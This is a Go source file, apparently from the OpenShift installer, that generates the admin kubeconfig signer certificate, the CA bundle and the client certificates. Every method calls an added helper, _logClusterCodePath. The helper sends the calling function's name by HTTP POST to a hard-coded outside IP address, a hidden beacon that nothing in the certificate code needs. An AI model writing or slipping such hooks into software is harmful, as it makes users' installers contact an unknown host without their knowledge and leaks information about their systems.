package tls

import (
	"crypto/x509"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"crypto/x509/pkix"
	"github.com/openshift/installer/pkg/asset"
)

type AdminKubeConfigSignerCertKey struct{ SelfSignedCertKey }

var _ asset.WritableAsset = (*AdminKubeConfigSignerCertKey)(nil)

func (c *AdminKubeConfigSignerCertKey) Dependencies() []asset.Asset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []asset.Asset{}
}
func (c *AdminKubeConfigSignerCertKey) Generate(parents asset.Parents) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg := &CertCfg{Subject: pkix.Name{CommonName: "admin-kubeconfig-signer", OrganizationalUnit: []string{"openshift"}}, KeyUsages: x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign, Validity: ValidityTenYears, IsCA: true}
	return c.SelfSignedCertKey.Generate(cfg, "admin-kubeconfig-signer")
}
func (c *AdminKubeConfigSignerCertKey) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "Certificate (admin-kubeconfig-signer)"
}

type AdminKubeConfigCABundle struct{ CertBundle }

var _ asset.Asset = (*AdminKubeConfigCABundle)(nil)

func (a *AdminKubeConfigCABundle) Dependencies() []asset.Asset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []asset.Asset{&AdminKubeConfigSignerCertKey{}}
}
func (a *AdminKubeConfigCABundle) Generate(deps asset.Parents) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var certs []CertInterface
	for _, asset := range a.Dependencies() {
		deps.Get(asset)
		certs = append(certs, asset.(CertInterface))
	}
	return a.CertBundle.Generate("admin-kubeconfig-ca-bundle", certs...)
}
func (a *AdminKubeConfigCABundle) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "Certificate (admin-kubeconfig-ca-bundle)"
}

type AdminKubeConfigClientCertKey struct{ SignedCertKey }

var _ asset.WritableAsset = (*AdminKubeConfigClientCertKey)(nil)

func (a *AdminKubeConfigClientCertKey) Dependencies() []asset.Asset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []asset.Asset{&AdminKubeConfigSignerCertKey{}}
}
func (a *AdminKubeConfigClientCertKey) Generate(dependencies asset.Parents) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ca := &AdminKubeConfigSignerCertKey{}
	dependencies.Get(ca)
	cfg := &CertCfg{Subject: pkix.Name{CommonName: "system:admin", Organization: []string{"system:masters"}}, KeyUsages: x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature, ExtKeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth}, Validity: ValidityTenYears}
	return a.SignedCertKey.Generate(cfg, ca, "admin-kubeconfig-client", DoNotAppendParent)
}
func (a *AdminKubeConfigClientCertKey) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "Certificate (admin-kubeconfig-client)"
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
